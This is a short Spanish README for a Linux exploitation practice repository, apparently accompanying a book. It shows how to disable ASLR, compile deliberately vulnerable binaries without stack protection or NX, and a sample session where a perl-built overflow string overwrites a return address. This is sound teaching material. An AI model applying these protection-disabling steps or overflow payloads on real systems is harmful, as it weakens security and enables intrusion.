# Repositorio para practicar con Linux Exploiting

Desactivar mecanismo de aleatorización de posiciones de memoria

    echo 0 > /proc/sys/kernel/randomize_va_space

Reactivar

    echo 2 > /proc/sys/kernel/randomize_va_space

```bash
setarch `arch` -R ./ejemplo argumentos
```

```bash
setarch `uname -m` -R ./ejemplo argumentos
```

## Comando para compilar los ejemplos del libro

    gcc -fno-stack-protector -D_FORTIFY_SOURCE=0 -z norelro -z execstack fichero_fuente.c -o fichero_salida

    alias gcc-exploit='gcc -fno-stack-protector -D_FORTIFY_SOURCE=0 -z norelro -z execstack'

Ver lo que ocupan las secciones de un programa ejecutable

    size ./ejemplo

Consultar el código ensamblador de un programa

    objdump -d

Buscar la función func en el código ensamblador del programa

    objdump -d ejemplo | grep func

```
vagrant@vagrant-ubuntu-trusty-32:~$ objdump -d ejemplo | grep func
0804848d <func>:
 80484f5:	e8 93 ff ff ff       	call   804848d <func>
vagrant@vagrant-ubuntu-trusty-32:~$ ./ejemplo `perl -e 'print "A"x44 . "\x8d\x84\x04\x08"x4'`

Bienvenido a Linux Exploiting AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����


Bienvenido a Linux Exploiting U���8��D$�E؉$�����E؉D$�$��x�����U�������t!�E
                                                                          �

Segmentation fault (core dumped)
```
